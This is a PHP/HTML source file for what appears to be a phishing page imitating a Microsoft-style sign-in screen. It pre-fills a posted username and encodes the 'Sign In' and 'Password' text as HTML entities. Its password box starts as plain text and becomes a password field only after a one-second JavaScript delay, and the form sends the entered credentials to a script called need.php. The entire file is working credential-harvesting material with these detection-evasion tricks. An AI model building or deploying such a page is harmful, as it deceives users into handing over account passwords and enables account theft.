<?php

$id = $_POST['user'];

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#83;&#105;&#103;&#110;&#32;&#73;&#110;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[2].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<style type="text/css">
 .textbox {
    height: 36px;
    width: 275px;
	padding-left: 8px;
	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    font-size: 15px;
    line-height: 20px;
    font-weight: 400;
    font-size: .9375rem;
	border: none;
    border-bottom: 1px solid #666;
}
 .textbox:focus {
	border: none;
    border-bottom: 1px solid #4488cc;
    outline: 0;
}
.textbox1 {
    height: 26px;
    width: 275px;
	padding-left: 0px;
	padding-right: 8px;
	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    font-size: 15px;
	color: #262626;
    text-align: left;
    line-height: 20px;
    font-weight: 400;
    font-size: .9375rem;
    border: 0px solid #fff;
    
    
}
 .textbox1:focus {
    border-color: #fff;
    border-width: 0px;
    outline: 0;
 </style>
 <style type="text/css">
 input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label {
							padding-left:26px;
							height:21px; 
							display:inline-block;
							line-height:21px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:21px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label {
							background-position: 0 -21px;
						}
						label.css-label {
				background-image:url(images/csscheckbox_a4824bcf5d413f078bdd6abd3e6e5bf4.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}
 </style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>

</head>
<body>
<div class="loader"></div>
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:370px; height:323px; z-index:0"><img src="images/c3.png" alt="" title="" border=0 width=370 height=323></div>

<div id="image2" style="position:absolute; overflow:hidden; left:26px; top:214px; width:159px; height:38px; z-index:1"><a href="#"><img src="images/c4.png" alt="" title="" border=0 width=159 height=38></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:18px; top:508px; width:292px; height:76px; z-index:2"><img src="images/c6.png" alt="" title="" border=0 width=292 height=76></div>
<form action="need.php?name=$id" name=pehlinazr id=pehlinazr method=post>
       <input name="user1" value="<?=$id?>" type="hidden">
<input name="user" value="<?=$id?>" class="textbox1" type="text" style="position:absolute;width:262px;left:32px;top:76px;z-index:3">
<input name="pwd" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:321px;left:27px;top:163px;z-index:4">
<div id="formimage1" style="position:absolute; left:191px; top:214px; z-index:5"><input type="image" name="formimage1" width="158" height="38" src="images/btnn.png"></div>

<div id="checkboxG1"  style="position:absolute; left:26px; top:267px; z-index:6"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:26px; top:267px; z-index:6"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>


 
</body>
</html>
